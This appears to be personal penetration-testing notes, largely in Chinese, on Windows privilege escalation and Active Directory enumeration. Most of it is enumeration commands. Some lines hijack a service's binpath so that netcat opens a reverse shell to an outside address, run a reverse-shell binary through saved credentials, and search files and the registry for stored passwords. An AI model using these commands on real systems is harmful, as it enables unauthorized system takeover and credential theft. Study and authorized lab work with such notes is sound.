# 🥳 枚举

1. 插件枚举

```
1. PowerUp.ps1全部检查
```

powershell -exec bypass -Command "Import-Module .\PowerUp.ps1;Invoke-AllChecks"

```
2.具体检查
```

accesschk.exe accepteula 先默认这个 C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe" 像这样

1. 手工检查

accesschk.exe -uwcqv "bob" \* /accepteula

accesschk.exe -ucqv SSDPSRV /accepteula accesschk.exe -ucqv upnphost /accepteula

sc qc upnphost

sc config upnphost binpath= "C:\inetpub\wwwroot\nc.exe -nv 192.168.119.175 2222 -e C:\WINDOWS\System32\cmd.exe"

sc config upnphost obj= ".\LocalSystem" password= "" sc config SSDPSRV start= auto

net start SSDPSRV

net start upnphost

```bash
// What system are we connected to?
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

// Get the hostname and username (if available)
hostname
echo %username%

// Get users
net users
net user [username]

// Networking stuff
ipconfig /all

// Printer?
route print

// ARP-arific
arp -A

// Active network connections
netstat -ano

// Firewall fun (Win XP SP2+ only)
netsh firewall show state
netsh firewall show config

// Scheduled tasks
schtasks /query /fo LIST /v

// Running processes to started services
tasklist /SVC
net start

// Driver madness
DRIVERQUERY

// WMIC fun (Win 7/8 -- XP requires admin)
wmic /?
# Use wmic_info script!

// WMIC: check patch level
wmic qfe get Caption,Description,HotFixID,InstalledOn

// Search pathces for given patch
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."

// AlwaysInstallElevated fun
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

// Other commands to run to hopefully get what we need
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

// Service permissions
sc query
sc qc [service_name]

// Accesschk stuff
accesschk.exe /accepteula (always do this first!!!!!)
accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)
accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
accesschk.exe -ucqv [service_name]

// Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\

// Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*

// Binary planting
sc config [service_name] binpath= "C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe"
sc config [service_name] obj= ".\LocalSystem" password= ""
sc qc [service_name] (to verify!)
net start [service_name]

Mostly all of this taken from http://www.fuzzysecurity.com/tutorials/16.html
```

```bash
whoami /groups
whoami /all 
whoami /priv
where /R c:\ confCons.xml 可能存在密码（提取脚本在下面）
cmdkey /lists（看有没有暴露出其他的用户密码，如果有，下一步）
runas savecred /user:admin C:/PrivEsclreverse.exe
C:\Program Files (x86) 查看应用程序
netstat -ano | findstr LISTEN   查看服务端口
netstat -ano | findstr TCP | findstr ":0" 也是查看服务端口
tasklist /v | findstr 7400   查对应的pid对应的服务

注册表检测
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
如果有问题跳到服务问题子文档服务表权限异常
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
查询自动运行（看有没有autorun文件）
```

还有有些可供参考的

```bash

systeminfo等以及下面的
    net user /domain– 在加入域的主机上运行以枚举域用户
    net user user.name /domain– 在加入域的主机上运行以获取有关特定域用户的信息
    net group /domain– 在加入域的主机上运行以枚举域组
    net group groupName /domain– 在加入域的主机上运行以获取有关特定域组的信息
    net accounts /domain- 在已加入域的主机上运行以显示域密码和帐户锁定策略  
======================================================
下面是ps命令：
-------------------------清单-------------------------
#导入PowerView.ps1脚本  
Import-Module .\PowerView.ps1 

#获得域信息 
Get-NetDomain 

#获得域控信息
Get-NetDomainController 

#获得域内的用户 
Get-NetUser | select name 
 
#获得域内的组 
Get-NetGroup | select name 

#获得域内组中带有admin的 
Get-NetGroup *admin* | select name 

#获得域内组中用户alice的信息
Get-NetGroup -UserName Alice 

#查看"Domain Admins"组的信息 
Get-NetGroup "Domain Admins" 
 
#获得域内主机的名字
Get-NetComputer | select name 
------------------------------------------------------

对用户：
    Get-ADUser -Filter *– 返回所有域用户
    Get-ADUser -Filter 'Name -like "*stevens"'– 查找名称以结尾的任何用户 ...stevens
    Get-ADUser -Identity john.doe -Properties *– 找到用户 john.doe并返回所有属性 
  
对组：  
    Get-ADGroup -Filter *– 返回所有域组
    Get-ADGroup -Identity Administrators | Get-ADGroupMember- 管道 Administrators将对象分组到 Get-ADGroupMember检索组的成员 
  
对时间：
# February 28, 2022 00:00:00 (system time zone)
$modifiedDate = Get-Date '2022/02/28'
Get-ADObject -Filter 'whenChanged -ge $modifiedDate' -IncludeDeletedObjects

对域环境：
Get-ADDomain  从域控制器获取有关域的信息 

更改用户密码
$oldPass = Read-Host -AsSecureString -Prompt 'Enter the old password'
$newPass = Read-Host -AsSecureString -Prompt 'Enter the new password'
Set-ADAccountPassword -Identity user.name -OldPassword $oldpPass -NewPassword $newPass

```
